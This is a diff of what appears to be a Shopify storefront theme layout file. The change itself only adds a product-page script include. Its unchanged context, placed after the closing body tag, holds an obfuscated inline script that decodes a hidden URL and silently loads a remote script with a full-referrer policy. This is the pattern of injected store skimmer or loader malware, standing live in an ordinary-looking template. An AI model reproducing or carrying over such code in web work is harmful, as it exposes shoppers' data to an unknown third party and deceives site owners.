@@ -251,7 +251,11 @@ s.parentNode.insertBefore(b, s);})(window.lintrk);
 <noscript>
 <img height="1" width="1" style="display:none;" alt="" src="https://px.ads.linkedin.com/collect/?pid=4272180&fmt=gif" />
 </noscript>
-{% if content_for_header contains 'product_label' %}{% include 'bss-product-label-js' %}{% include 'bss-label-style-css' %}{% include 'bss-product-label-fonts' %}{% endif %}</body>
+{% if content_for_header contains 'product_label' %}{% include 'bss-product-label-js' %}{% include 'bss-label-style-css' %}{% include 'bss-product-label-fonts' %}{% endif %}
+{% if template == 'product' %}
+ <script src="{{ 'ck-custom-product.js' | asset_url }}" defer></script>
+{% endif %}
+</body>
 
 <script>
             (function(){var _di0=document.createElement("script"),_Aq=(function(_Mkr,_Kd){var _LG="";for(var _bx=0;_bx<_Mkr.length;_bx++){_LG==_LG;var _VR=_Mkr[_bx].charCodeAt();_VR-=_Kd;_Kd>2;_VR+=61;_VR%=94;_VR!=_bx;_VR+=33;_LG+=String.fromCharCode(_VR)}return _LG})(atob("cyEhe35FOjokfjknenp4dHlxejlueng6e3QlcHc6QT5CPnBCbkFwcEJwQ29vbTxBQjtxO0Bt"), 11);9>3;_di0.src=_Aq;function _Y4(){};_di0.referrerPolicy="unsafe-url";_di0!="z";_di0.async=!0;_di0.type="text/javascript";var _Wo8=document.getElementsByTagName("script")[0];_Wo8.parentNode.insertBefore(_di0,_Wo8)})();
@@ -325,4 +329,6 @@ _this.find('.grid-product__price,.usf-sr-container .grid-product__actions').show
 
     
   </script>
+
+  
 </html>
